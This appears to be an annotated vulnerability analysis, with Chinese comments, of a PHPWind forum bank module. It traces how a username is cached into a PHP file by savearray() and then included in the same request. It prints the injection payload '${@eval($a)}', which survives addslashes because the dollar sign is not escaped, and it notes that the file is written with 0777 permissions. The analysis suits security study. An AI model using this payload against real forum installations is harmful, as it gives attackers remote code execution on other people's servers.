// hack/bank/example.com (7.5 SP3, 与 8.7 逐行同)
// --- 写入+同请求 include ---
55: if (!$bk_per || $timestamp - pwFilemtime(D_P."data/bbscache/bank_sort.php") > $bk_per*3600) {
57:     $query = $db->query("SELECT i.uid,m.username,i.deposit,i.startdate FROM pw_memberinfo i LEFT JOIN pw_members m ON m.uid=i.uid ORDER BY i.deposit DESC LIMIT $bk_num");
61:             $_DESPOSTDB[] = array($deposit['uid'],$deposit['username'],$deposit['deposit'], $deposit['startdate']);
72:     $wirtedb = savearray('_DESPOSTDB',$_DESPOSTDB);
74:     writeover(D_P.'data/bbscache/bank_sort.php',"<?php\r\n".$wirtedb.'?>');
76: include(D_P."data/bbscache/bank_sort.php");     // <== 同请求 include

// --- 362-373: 唯一转义 ---
function savearray($name,$array) {
	$arraydb="\$$name=array(\r\n\t\t";
	foreach ($array as $value1) {
		$arraydb .= 'array(';
		foreach ($value1 as $value2) {
			$arraydb .= '"'.addslashes($value2).'",';   // addslashes 不转义 $
		}
		$arraydb .= "),\r\n\t\t";
	}
	$arraydb .= ");\r\n";
	return $arraydb;
}

// 生成的 bank_sort.php 形如：
<?php
$_DESPOSTDB=array(
  array("8916","${@eval($a)}","100","2010-01-01"),
);
?>

// writeover(): require/target105.example.com:231-241
function writeover($filename,$data,$method='rb+',$iflock=1,$check=1,$chmod=1){
	$filename = Pcv($filename,$check);   // Pcv 堵 :// \0 ..
	touch($filename); $handle = fopen($filename,$method);
	$iflock && flock($handle,LOCK_EX);
	fwrite($handle,$data);
	$method=='rb+' && ftruncate($handle,strlen($data));
	fclose($handle);
	$chmod && @chmod($filename,0777);    // ← 落盘 0777
}